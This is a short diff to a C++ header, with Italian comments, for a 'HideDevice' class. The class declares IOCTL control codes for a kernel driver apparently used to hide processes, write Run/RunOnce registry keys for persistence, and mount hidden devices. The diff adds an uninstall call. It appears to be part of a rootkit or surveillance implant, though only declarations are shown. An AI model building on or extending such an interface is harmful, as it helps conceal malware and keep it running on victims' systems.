@@ -36,6 +36,7 @@ class HideDevice
 	BOOL HideDevice::unhook_regdeleteW(WCHAR *value_name);				// Cancella una chiave da Run/RunOnce
 	BOOL HideDevice::unhook_regwriteA(char *value_name, char *value);	// Inserisce una chiave in Run/RunOnce
 	BOOL HideDevice::unhook_regdeleteA(char *value_name);				// Cancella una chiave da Run/RunOnce
+	BOOL HideDevice::unhook_uninstall();								// Rimuove il driver dal registry
 	BOOL HideDevice::df_thaw(WCHAR freezed, WCHAR *thawed);				// Monta un device "reale"
 	BOOL HideDevice::df_freeze();										// Smonta un device "reale"
 
@@ -74,6 +75,7 @@ class HideDevice
 #define REG_FUNCTION	0x0885
 #define THAW_FUNCTION	0x0886
 #define FREEZE_FUNCTION 0x0887
+#define UNINSTALL_FUNCTION  0x0888
 
 #define IOCTL_UNHOOK CTL_CODE(FILE_DEVICE_H4DRIVER, UNHOOK_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS) // 0x8234A20C
 #define IOCTL_ADDPID CTL_CODE(FILE_DEVICE_H4DRIVER, ADDPID_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS) // 0x8234A210
@@ -81,3 +83,5 @@ class HideDevice
 #define IOCTL_REG 	 CTL_CODE(FILE_DEVICE_H4DRIVER, REG_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS)    // 0x8234A214
 #define IOCTL_THAW   CTL_CODE(FILE_DEVICE_H4DRIVER, THAW_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS)   
 #define IOCTL_FREEZE CTL_CODE(FILE_DEVICE_H4DRIVER, FREEZE_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS) 
+#define IOCTL_UNINST CTL_CODE(FILE_DEVICE_H4DRIVER, UNINSTALL_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS) 
+
